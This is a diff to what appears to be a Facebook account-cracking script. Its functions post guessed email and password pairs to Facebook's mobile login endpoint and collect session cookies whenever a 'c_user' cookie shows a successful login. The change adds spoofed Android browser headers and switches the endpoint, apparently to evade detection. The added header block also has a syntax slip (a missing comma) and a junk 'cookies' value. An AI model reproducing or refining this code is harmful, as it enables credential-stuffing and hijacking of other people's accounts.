@@ -1173,8 +1173,15 @@ def m5(idf,pwv):
    "email":idf,
    "pass":ps,
    "login":"Log In"}
+   head = {'Host': 'www.facebook.com',
+   'content-length': str(len(data)),
+   'content-type': 'application/reports+json',
+   'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',
+   'accept-encoding': 'gzip, deflate, br, zstd',
+   'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7'
+   'cookies': 'queen_bithika'}
   #'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',}
-   lo = session.post('https://free.facebook.com/login/device-based/login/async/',data=log_data).text
+   lo = session.post('https://m.facebook.com/login/device-based/login/async/',data=log_data,headers=head).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -1232,6 +1239,7 @@ def m6(idf,pwv):
    "email":idf,
    "pass":pw,
    "login":"Log In"} 
+ 
    lo = session.post('https://m.facebook.com/login/device-based/login/async/',data=log_data).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
